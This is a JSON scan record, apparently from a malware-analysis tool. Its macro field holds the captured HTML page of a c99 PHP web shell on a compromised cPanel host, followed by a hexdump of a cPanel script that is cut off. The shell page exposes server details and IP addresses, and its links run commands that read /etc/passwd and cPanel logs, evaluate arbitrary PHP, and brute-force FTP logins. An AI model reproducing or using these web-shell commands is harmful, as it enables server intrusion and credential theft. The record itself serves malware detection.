{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "mkdir": "May create a directory",
            "open": "May open a file",
            "output": "May write to a file",
            "put": "May write to a file",
            "run": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac",
            "windows": "May enumerate application windows"
        },
        "macro": "GIF89;a\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fscripts%2F&sort=0a\"><b>scripts/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=white>drwxr-xr-x</font></b><br><b>Free 6.76 GB of 7.65 GB (88.4%)</b><br><b>Your ip: <a href=http://87.177.181.133>87.177.181.133</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fscripts%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fscripts%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fscripts%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fscripts%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fscripts%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fscripts%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fscripts%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fscripts%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fscripts%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[setupmailserver]&nbsp;setupmailserver (10.91 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=white>-rwxr-xr-x</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=setupmailserver&ft=info&d=%2Fscripts%2F\"><b><u>[hex]</u></b></a> (<a href=\"?act=f&f=setupmailserver&ft=info&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=html&d=%2Fscripts%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=html&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=txt&d=%2Fscripts%2F\"><b>[txt]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=txt&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=code&d=%2Fscripts%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=code&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=phpsess&d=%2Fscripts%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=phpsess&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=exe&d=%2Fscripts%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=exe&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=sdb&d=%2Fscripts%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=sdb&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=img&d=%2Fscripts%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=img&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=ini&d=%2Fscripts%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=ini&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=download&d=%2Fscripts%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=download&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=notepad&d=%2Fscripts%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=notepad&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=edit&d=%2Fscripts%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=edit&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> /scripts/setupmailserver</td></tr><tr><td><b>Size</b></td><td> 10.91 KB</td></tr><tr><td><b>MD5</b></td><td> e4ede921f3225f573b93d29cf4a06de4</td></tr><tr><td><b>Owner/Group</b></td><td> root/root<tr><td><b>Perms</b></td><td><a href=\"?act=chmod&f=setupmailserver&d=%2Fscripts%2F\"><font color=white>-rwxr-xr-x</font></a></td></tr><tr><td><b>Create time</b></td><td> 07/02/2011 12:25:56</td></tr><tr><td><b>Access time</b></td><td> 13/01/2011 03:54:36</td></tr><tr><td><b>MODIFY time</b></td><td> 09/11/2010 01:55:17</td></tr></table><br><b>FULL HEXDUMP</b><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>00000000<br>00000018<br>00000030<br>00000048<br>00000060<br>00000078<br>00000090<br>000000A8<br>000000C0<br>000000D8<br>000000F0<br>00000108<br>00000120<br>00000138<br>00000150<br>00000168<br>00000180<br>00000198<br>000001B0<br>000001C8<br>000001E0<br>000001F8<br>00000210<br>00000228<br>00000240<br>00000258<br>00000270<br>00000288<br>000002A0<br>000002B8<br>000002D0<br>000002E8<br>00000300<br>00000318<br>00000330<br>00000348<br>00000360<br>00000378<br>00000390<br>000003A8<br>000003C0<br>000003D8<br>000003F0<br>00000408<br>00000420<br>00000438<br>00000450<br>00000468<br>00000480<br>00000498<br>000004B0<br>000004C8<br>000004E0<br>000004F8<br>00000510<br>00000528<br>00000540<br>00000558<br>00000570<br>00000588<br>000005A0<br>000005B8<br>000005D0<br>000005E8<br>00000600<br>00000618<br>00000630<br>00000648<br>00000660<br>00000678<br>00000690<br>000006A8<br>000006C0<br>000006D8<br>000006F0<br>00000708<br>00000720<br>00000738<br>00000750<br>00000768<br>00000780<br>00000798<br>000007B0<br>000007C8<br>000007E0<br>000007F8<br>00000810<br>00000828<br>00000840<br>00000858<br>00000870<br>00000888<br>000008A0<br>000008B8<br>000008D0<br>000008E8<br>00000900<br>00000918<br>00000930<br>00000948<br>00000960<br>00000978<br>00000990<br>000009A8<br>000009C0<br>000009D8<br>000009F0<br>00000A08<br>00000A20<br>00000A38<br>00000A50<br>00000A68<br>00000A80<br>00000A98<br>00000AB0<br>00000AC8<br>00000AE0<br>00000AF8<br>00000B10<br>00000B28<br>00000B40<br>00000B58<br>00000B70<br>00000B88<br>00000BA0<br>00000BB8<br>00000BD0<br>00000BE8<br>00000C00<br>00000C18<br>00000C30<br>00000C48<br>00000C60<br>00000C78<br>00000C90<br>00000CA8<br>00000CC0<br>00000CD8<br>00000CF0<br>00000D08<br>00000D20<br>00000D38<br>00000D50<br>00000D68<br>00000D80<br>00000D98<br>00000DB0<br>00000DC8<br>00000DE0<br>00000DF8<br>00000E10<br>00000E28<br>00000E40<br>00000E58<br>00000E70<br>00000E88<br>00000EA0<br>00000EB8<br>00000ED0<br>00000EE8<br>00000F00<br>00000F18<br>00000F30<br>00000F48<br>00000F60<br>00000F78<br>00000F90<br>00000FA8<br>00000FC0<br>00000FD8<br>00000FF0<br>00001008<br>00001020<br>00001038<br>00001050<br>00001068<br>00001080<br>00001098<br>000010B0<br>000010C8<br>000010E0<br>000010F8<br>00001110<br>00001128<br>00001140<br>00001158<br>00001170<br>00001188<br>000011A0<br>000011B8<br>000011D0<br>000011E8<br>00001200<br>00001218<br>00001230<br>00001248<br>00001260<br>00001278<br>00001290<br>000012A8<br>000012C0<br>000012D8<br>000012F0<br>00001308<br>00001320<br>00001338<br>00001350<br>00001368<br>00001380<br>00001398<br>000013B0<br>000013C8<br>000013E0<br>000013F8<br>00001410<br>00001428<br>00001440<br>00001458<br>00001470<br>00001488<br>000014A0<br>000014B8<br>000014D0<br>000014E8<br>00001500<br>00001518<br>00001530<br>00001548<br>00001560<br>00001578<br>00001590<br>000015A8<br>000015C0<br>000015D8<br>000015F0<br>00001608<br>00001620<br>00001638<br>00001650<br>00001668<br>00001680<br>00001698<br>000016B0<br>000016C8<br>000016E0<br>000016F8<br>00001710<br>00001728<br>00001740<br>00001758<br>00001770<br>00001788<br>000017A0<br>000017B8<br>000017D0<br>000017E8<br>00001800<br>00001818<br>00001830<br>00001848<br>00001860<br>00001878<br>00001890<br>000018A8<br>000018C0<br>000018D8<br>000018F0<br>00001908<br>00001920<br>00001938<br>00001950<br>00001968<br>00001980<br>00001998<br>000019B0<br>000019C8<br>000019E0<br>000019F8<br>00001A10<br>00001A28<br>00001A40<br>00001A58<br>00001A70<br>00001A88<br>00001AA0<br>00001AB8<br>00001AD0<br>00001AE8<br>00001B00<br>00001B18<br>00001B30<br>00001B48<br>00001B60<br>00001B78<br>00001B90<br>00001BA8<br>00001BC0<br>00001BD8<br>00001BF0<br>00001C08<br>00001C20<br>00001C38<br>00001C50<br>00001C68<br>00001C80<br>00001C98<br>00001CB0<br>00001CC8<br>00001CE0<br>00001CF8<br>00001D10<br>00001D28<br>00001D40<br>00001D58<br>00001D70<br>00001D88<br>00001DA0<br>00001DB8<br>00001DD0<br>00001DE8<br>00001E00<br>00001E18<br>00001E30<br>00001E48<br>00001E60<br>00001E78<br>00001E90<br>00001EA8<br>00001EC0<br>00001ED8<br>00001EF0<br>00001F08<br>00001F20<br>00001F38<br>00001F50<br>00001F68<br>00001F80<br>00001F98<br>00001FB0<br>00001FC8<br>00001FE0<br>00001FF8<br>00002010<br>00002028<br>00002040<br>00002058<br>00002070<br>00002088<br>000020A0<br>000020B8<br>000020D0<br>000020E8<br>00002100<br>00002118<br>00002130<br>00002148<br>00002160<br>00002178<br>00002190<br>000021A8<br>000021C0<br>000021D8<br>000021F0<br>00002208<br>00002220<br>00002238<br>00002250<br>00002268<br>00002280<br>00002298<br>000022B0<br>000022C8<br>000022E0<br>000022F8<br>00002310<br>00002328<br>00002340<br>00002358<br>00002370<br>00002388<br>000023A0<br>000023B8<br>000023D0<br>000023E8<br>00002400<br>00002418<br>00002430<br>00002448<br>00002460<br>00002478<br>00002490<br>000024A8<br>000024C0<br>000024D8<br>000024F0<br>00002508<br>00002520<br>00002538<br>00002550<br>00002568<br>00002580<br>00002598<br>000025B0<br>000025C8<br>000025E0<br>000025F8<br>00002610<br>00002628<br>00002640<br>00002658<br>00002670<br>00002688<br>000026A0<br>000026B8<br>000026D0<br>000026E8<br>00002700<br>00002718<br>00002730<br>00002748<br>00002760<br>00002778<br>00002790<br>000027A8<br>000027C0<br>000027D8<br>000027F0<br>00002808<br>00002820<br>00002838<br>00002850<br>00002868<br>00002880<br>00002898<br>000028B0<br>000028C8<br>000028E0<br>000028F8<br>00002910<br>00002928<br>00002940<br>00002958<br>00002970<br>00002988<br>000029A0<br>000029B8<br>000029D0<br>000029E8<br>00002A00<br>00002A18<br>00002A30<br>00002A48<br>00002A60<br>00002A78<br>00002A90<br>00002AA8<br>00002AC0<br>00002AD8<br>00002AF0<br>00002B08<br>00002B20<br>00002B38<br>00002B50<br>00002B68<br>00002B80<br>00002B98<br></td><td bgcolor=000000>23 21 2F 75 73 72 2F 62 69 6E 2F 70 65 72 6C 0A 23 20 63 70 61 6E 65 6C <br>20 2D 20 73 65 74 75 70 6D 61 69 6C 73 65 72 76 65 72 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 43 6F 70 79 72 69 <br>67 68 74 28 63 29 20 32 30 31 30 20 63 50 61 6E 65 6C 2C 20 49 6E 63 2E <br>0A 23 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 20 20 20 20 41 6C 6C 20 72 69 67 68 74 73 20 <br>52 65 73 65 72 76 65 64 2E 0A 23 20 63 6F 70 79 72 69 67 68 74 40 63 70 <br>61 6E 65 6C 2E 6E 65 74 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 <br>20 68 74 74 70 3A 2F 2F 63 70 61 6E 65 6C 2E 6E 65 74 0A 23 20 54 68 69 <br>73 20 63 6F 64 65 20 69 73 20 73 75 62 6A 65 63 74 20 74 6F 20 74 68 65 <br>20 63 50 61 6E 65 6C 20 6C 69 63 65 6E 73 65 2E 20 55 6E 61 75 74 68 6F <br>72 69 7A 65 64 20 63 6F 70 79 69 6E 67 20 69 73 20 70 72 6F 68 69 62 69 <br>74 65 64 0A 0A 42 45 47 49 4E 20 7B 20 75 6E 73 68 69 66 74 20 40 49 4E <br>43 2C 20 27 2F 75 73 72 2F 6C 6F 63 61 6C 2F 63 70 61 6E 65 6C 27 3B 20 <br>7D 0A 0A 75 73 65 20 73 74 72 69 63 74 3B 0A 75 73 65 20 43 70 61 6E 65 <br>6C 3A 3A 43 6F 6E 66 69 67 20 20 20 20 20 20 20 20 20 20 28 29 3B 0A 75 <br>73 65 20 43 70 61 6E 65 6C 3A 3A 43 68 6B 73 65 72 76 64 20 20 20 20 20 <br>20 20 20 28 29 3B 0A 75 73 65 20 43 70 61 6E 65 6C 3A 3A 53 79 73 3A 3A <br>4F 53 20 20 20 20 20 20 20 20 20 28 29 3B 0A 75 73 65 20 43 70 61 6E 65 <br>6C 3A 3A 53 65 72 76 69 63 65 73 20 20 20 20 20 20 20 20 28 29 3B 0A 75 <br>73 65 20 43 70 61 6E 65 6C 3A 3A 53 61 66 65 52 75 6E 3A 3A 45 72 72 6F <br>72 73 20 28 29 3B 0A 75 73 65 20 43 70 61 6E 65 6C 3A 3A 53 53 4C 43 65 <br>72 74 73 20 20 20 20 20 20 20 20 28 29 3B 0A 75 73 65 20 43 70 61 6E 65 <br>6C 3A 3A 55 73 61 67 65 20 20 20 20 20 20 20 20 20 20 20 28 29 3B 0A 75 <br>73 65 20 43 70 61 6E 65 6C 3A 3A 50 49 44 20 20 20 20 20 20 20 20 20 20 <br>20 20 20 28 29 3B 0A 75 73 65 20 43 70 61 6E 65 6C 3A 3A 49 6E 69 74 20 <br>20 20 20 20 20 20 20 20 20 20 20 28 29 3B 0A 75 73 65 20 43 70 61 6E 65 <br>6C 3A 3A 55 70 64 61 74 65 20 20 20 20 20 20 20 20 20 20 28 29 3B 0A 0A <br>6D 79 20 24 68 65 6C 70 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 <br>20 20 20 20 3D 20 30 3B 0A 6D 79 20 24 6D 61 6E 20 20 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 20 20 20 20 3D 20 30 3B 0A 6D 79 20 24 66 6F <br>72 63 65 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 3D 20 <br>30 3B 0A 6D 79 20 24 63 75 72 72 65 6E 74 20 20 20 20 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 3D 20 30 3B 0A 6D 79 20 24 73 6B 69 70 5F 6D 61 69 <br>6C 64 69 72 5F 63 6F 6E 76 65 72 73 69 6F 6E 20 3D 20 30 3B 0A 24 7C 20 <br>3D 20 31 3B 0A 0A 64 65 6C 65 74 65 20 24 45 4E 56 7B 27 63 70 5F 73 65 <br>63 75 72 69 74 79 5F 74 6F 6B 65 6E 27 7D 3B 0A 64 65 6C 65 74 65 20 24 <br>45 4E 56 7B 27 48 54 54 50 5F 52 45 46 45 52 45 52 27 7D 3B 0A 0A 23 20 <br>41 72 67 75 6D 65 6E 74 20 70 72 6F 63 65 73 73 69 6E 67 0A 6D 79 20 25 <br>6F 70 74 73 20 3D 20 28 0A 20 20 20 20 27 66 6F 72 63 65 27 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 3D 3E 20 5C 24 66 6F 72 63 <br>65 2C 0A 20 20 20 20 27 63 75 72 72 65 6E 74 27 20 20 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 3D 3E 20 5C 24 63 75 72 72 65 6E 74 2C 0A 20 <br>20 20 20 27 73 6B 69 70 2D 6D 61 69 6C 64 69 72 2D 63 6F 6E 76 65 72 73 <br>69 6F 6E 27 20 3D 3E 20 5C 24 73 6B 69 70 5F 6D 61 69 6C 64 69 72 5F 63 <br>6F 6E 76 65 72 73 69 6F 6E 2C 0A 29 3B 0A 0A 43 70 61 6E 65 6C 3A 3A 55 <br>73 61 67 65 3A 3A 77 72 61 70 5F 6F 70 74 69 6F 6E 73 28 20 5C 40 41 52 <br>47 56 2C 20 5C 26 75 73 61 67 65 2C 20 5C 25 6F 70 74 73 20 29 3B 0A 0A <br>40 41 52 47 56 20 3D 20 28 20 67 72 65 70 28 20 21 2F 5E 2D 2D 2F 2C 20 <br>40 41 52 47 56 20 29 20 29 3B 0A 0A 6D 79 20 24 73 65 6C 65 63 74 65 64 <br>5F 6D 61 69 6C 73 65 72 76 65 72 20 3D 20 73 68 69 66 74 3B 0A 75 73 61 <br>67 65 28 29 20 75 6E 6C 65 73 73 20 28 20 24 73 65 6C 65 63 74 65 64 5F <br>6D 61 69 6C 73 65 72 76 65 72 20 7C 7C 20 24 63 75 72 72 65 6E 74 20 29 <br>3B 0A 0A 6D 79 20 24 63 70 63 6F 6E 66 5F 72 65 66 20 3D 20 43 70 61 6E <br>65 6C 3A 3A 43 6F 6E 66 69 67 3A 3A 6C 6F 61 64 63 70 63 6F 6E 66 28 29 <br>3B 0A 6D 79 20 24 73 74 6F 72 61 67 65 5F 74 79 70 65 20 3D 20 24 63 70 <br>63 6F 6E 66 5F 72 65 66 2D 3E 7B 27 6D 61 69 6C 64 69 72 27 7D 20 3F 20 <br>27 6D 61 69 6C 64 69 72 27 20 3A 20 27 6D 62 6F 78 27 3B 0A 24 63 70 63 <br>6F 6E 66 5F 72 65 66 2D 3E 7B 27 6D 61 69 6C 73 65 72 76 65 72 27 7D 20 <br>3D 20 24 73 74 6F 72 61 67 65 5F 74 79 70 65 20 65 71 20 27 6D 62 6F 78 <br>27 20 3F 20 27 63 70 70 6F 70 27 20 3A 20 64 65 66 69 6E 65 64 20 24 63 <br>70 63 6F 6E 66 5F 72 65 66 2D 3E 7B 27 6D 61 69 6C 73 65 72 76 65 72 27 <br>7D 20 3F 20 24 63 70 63 6F 6E 66 5F 72 65 66 2D 3E 7B 27 6D 61 69 6C 73 <br>65 72 76 65 72 27 7D 20 3A 20 27 63 6F 75 72 69 65 72 27 3B 0A 6D 79 20 <br>24 6C 61 73 74 5F 61 63 74 69 76 65 5F 6D 61 69 6C 73 65 72 76 65 72 20 <br>3D 20 24 63 70 63 6F 6E 66 5F 72 65 66 2D 3E 7B 27 6D 61 69 6C 73 65 72 <br>76 65 72 27 7D 3B 0A 6D 79 20 24 63 75 72 72 65 6E 74 5F 6D 61 69 6C 73 <br>65 72 76 65 72 20 3D 20 43 70 61 6E 65 6C 3A 3A 53 65 72 76 69 63 65 73 <br>3A 3A 69 73 5F 65 6E 61 62 6C 65 64 28 27 6D 61 69 6C 27 29 20 3F 20 24 <br>63 70 63 6F 6E 66 5F 72 65 66 2D 3E 7B 27 6D 61 69 6C 73 65 72 76 65 72 <br>27 7D 20 3A 20 27 64 69 73 61 62 6C 65 64 27 3B 0A 0A 69 66 20 28 24 63 <br>75 72 72 65 6E 74 29 20 7B 0A 20 20 20 20 70 72 69 6E 74 20 22 43 75 72 <br>72 65 6E 74 20 6D 61 69 6C 73 65 72 76 65 72 20 74 79 70 65 3A 20 24 7B <br>63 75 72 72 65 6E 74 5F 6D 61 69 6C 73 65 72 76 65 72 7D 5C 6E 22 3B 0A <br>20 20 20 20 70 72 69 6E 74 20 22 43 75 72 72 65 6E 74 20 73 74 6F 72 61 <br>67 65 20 66 6F 72 6D 61 74 3A 20 24 7B 73 74 6F 72 61 67 65 5F 74 79 70 <br>65 7D 5C 6E 22 3B 0A 20 20 20 20 65 78 69 74 20 30 3B 0A 7D 0A 0A 69 66 <br>20 28 20 24 73 74 6F 72 61 67 65 5F 74 79 70 65 20 65 71 20 27 6D 62 6F <br>78 27 20 29 20 7B 0A 20 20 20 20 69 66 20 28 20 24 73 65 6C 65 63 74 65 <br>64 5F 6D 61 69 6C 73 65 72 76 65 72 20 65 71 20 27 63 70 70 6F 70 27 20 <br>29 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E 74 20 22 41 6C 72 65 61 <br>64 79 20 63 6F 6E 66 69 67 75 72 65 64 2E 5C 6E 22 3B 0A 20 20 20 20 7D <br>0A 20 20 20 20 65 6C 73 65 20 7B 0A 20 20 20 20 20 20 20 20 70 72 69 6E <br>74 20 22 42 65 66 6F 72 65 20 73 65 6C 65 63 74 69 6E 67 20 61 20 6E 65 <br>77 20 6D 61 69 6C 20 73 65 72 76 65 72 20 79 6F 75 20 6D 75 73 74 20 66 <br>69 72 73 74 20 63 6F 6E 76 65 72 74 5C 6E 22 3B 0A 20 20 20 20 20 20 20 <br>20 70 72 69 6E 74 20 22 74 6F 20 74 68 65 20 6D 61 69 6C 64 69 72 20 73 <br>74 6F 72 61 67 65 20 66 6F 72 6D 61 74 20 75 73 69 6E 67 20 2F 73 63 72 <br>69 70 74 73 2F 63 6F 6E 76 65 72 74 32 6D 61 69 6C 64 69 72 5C 6E 22 3B <br>0A 20 20 20 20 7D 0A 20 20 20 20 65 78 69 74 20 30 3B 0A 7D 0A 0A 69 66 <br>20 28 20 21 24 66 6F 72 63 65 20 26 26 20 24 63 75 72 72 65 6E 74 5F 6D <br>61 69 6C 73 65 72 76 65 72 20 65 71 20 24 73 65 6C 65 63 74 65 64 5F 6D <br>61 69 6C 73 65 72 76 65 72 20 29 20 7B 0A 20 20 20 20 70 72 69 6E 74 20 <br>22 41 6C 72 65 61 64 79 20 63 6F 6E 66 69 67 75 72 65 64 2E 5C 6E 22 3B <br>0A 20 20 20 20 65 78 69 74 20 30 3B 0A 7D 0A 0A 75 6E 6C 65 73 73 20 28 <br>20 24 73 65 6C 65 63 74 65 64 5F 6D 61 69 6C 73 65 72 76 65 72 20 65 71 <br>20 27 64 6F 76 65 63 6F 74 27 20 7C 7C 20 24 73 65 6C 65 63 74 65 64 5F <br>6D 61 69 6C 73 65 72 76 65 72 20 65 71 20 27 63 6F 75 72 69 65 72 27 20 <br>7C 7C 20 24 73 65 6C 65 63 74 65 64 5F 6D 61 69 6C 73 65 72 76 65 72 20 <br>65 71 20 27 64 69 73 61 62 6C 65 64 27 20 29 20 7B 0A 20 20 20 20 70 72 <br>69 6E 74 20 22 55 6E 6B 6E 6F 77 6E 20 6D 61 69 6C 73 65 72 76 65 72 20 <br>74 79 70 65 20 73 70 65 63 69 66 69 65 64 2E 5C 6E 54 72 79 20 24 30 20 <br>2D 2D 68 65 6C 70 5C 6E 22 3B 0A 20 20 20 20 65 78 69 74 20 31 3B 0A 7D <br>0A 0A 69 66 20 28 20 24 3E 20 21 3D 20 30 20 29 20 7B 0A 20 20 20 20 64 <br>69 65 20 22 43 6F 6E 76 65 72 73 69 6F 6E 20 70 72 6F 63 65 73 73 20 6D <br>75 73 74 20 62 65 20 70 65 72 66 6F 72 6D 65 64 20 61 73 20 72 6F 6F 74 <br>22 3B 0A 7D 0A 0A 6D 79 20 24 70 69 64 5F 6F 62 6A 20 3D 20 43 70 61 6E <br>65 6C 3A 3A 50 49 44 2D 3E 6E 65 77 28 20 7B 20 27 70 69 64 5F 66 69 6C <br>65 27 20 3D 3E 20 27 2F 76 61 72 2F 72 75 6E 2F 73 65 74 75 70 6D 61 69 <br>6C 73 65 72 76 65 72 2E 70 69 64 27 20 7D 20 29 3B 0A 75 6E 6C 65 73 73 <br>20 28 20 24 70 69 64 5F 6F 62 6A 2D 3E 63 72 65 61 74 65 5F 70 69 64 5F <br>66 69 6C 65 28 29 20 3E 20 30 20 29 20 7B 0A 20 20 20 20 70 72 69 6E 74 <br>20 22 53 65 74 75 70 6D 61 69 6C 73 65 72 76 65 72 20 61 70 70 65 61 72 <br>73 20 74 6F 